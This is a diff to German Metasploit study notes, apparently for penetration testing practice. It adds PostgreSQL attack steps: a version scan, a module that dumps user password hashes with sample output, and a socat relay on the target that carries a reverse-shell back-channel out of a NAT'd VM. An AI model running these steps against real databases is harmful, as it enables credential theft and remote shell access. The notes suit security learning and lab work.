@@ -4,6 +4,9 @@
 MSF Basisbefehle
 ##################
 
+
+
+
 Start von Metasploit über die msfconsole
 
 .. code-block:: bash
@@ -44,7 +47,7 @@ Beispiel postgres.
 * Check gibt an, ob vorher geprüft werden kann, ob ein Exploit auf dem Zielsyste läuft oder nicht.
 * Disclosure Date gibt an, seit wann der Exploit bekannt ist.
 
-Mit use wird ein Modul ausgeählt. Entweder als Name angeben inkl. vollständigen Pfad oder aber die Nummer.
+Mit use wird ein Modul ausgewählt. Entweder als Name angeben inkl. vollständigen Pfad oder aber die Nummer.
 
 .. code-block:: Shell
 
@@ -53,7 +56,11 @@ Mit use wird ein Modul ausgeählt. Entweder als Name angeben inkl. vollständige
     use 9
 
 Mit info erhält man Informationen zu dem Module. Mit options werden die definierbaren Parameter angezeigt. 
-Mit set wird ein Parameterwert gesetzt
+
+* show options - Shows you all the basic options.
+* show advanced - Shows you all the advanced options.
+* show missing - Shows you all the required options you have not configured.
+* set - Shows you everything. Mit set wird ein Parameterwert gesetzt
 
 .. code-block:: Shell
 
@@ -71,8 +78,48 @@ Der Start erfolgt dann mit "run".
     [+] <IP> - Login Successful: admin:admin@template1   <-- Treffer
     [-] <IP> - LOGIN FAILED: postgres:postgres@template1 (Incorrect: FATAL   VFATAL  C28P01  Mpassword authentication failed for user "postgres"     Fauth.c L330    Rauth_failed)
 
+Postgresql Version ermitteln:
+
+.. code-block:: shell
+
+    msf6> use auxiliary/scanner/postgres/postgres_version
+    msf6> run postgres://admin:admin@<IP>
+
+    [*] <IP>:5432 Postgres - Version PostgreSQL 14.6 (Ubuntu 14.6-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit (Post-Auth)
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+
+Passwort Hashes ermitteln
+
+.. code-block:: shell
+
+    msf6> use auxiliary/scanner/postgres/postgres_hashdump
+    msf6> set password XXXXX
+    msf6> set username admin
+    msf6> set rhost <IP> 
+    msf6> run
+
+    Username  Hash
+    --------  ----
+    admin     <hash>
+    usera     <hash>
+
+Payload einsetzen: 
+
+Beim Testen mit Kali in der VM wird NAT eingesetzt, d.h. remote shells können keinen Rückkanal aufbauen, da die
+VM nicht sichtbar ist (`<https://www.infosecmatter.com/why-your-exploit-completed-but-no-session-was-created-try-these-fixes/>`_)
+Wenn man kein Bridge-Netz einsetzen möchte, kann man z.B. socat auf dem Zielsystem verwenden:
+
+.. code-block:: shell
+
+    socat -d -d TCP4-LISTEN:<LPORT>,reuseaddr,fork TCP4:<VM-IP>:<RPORT>
 
 
+Weitere Informationsmodule: 
 
+* Anzeige der Datenbanken über *use auxiliary/scanner/postgres/postgres_schemadump*
+* Absetzen von SQL Befehlen: *use auxiliary/admin/postgres/postgres_sql*
+
+`<https://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt>`_
 
 
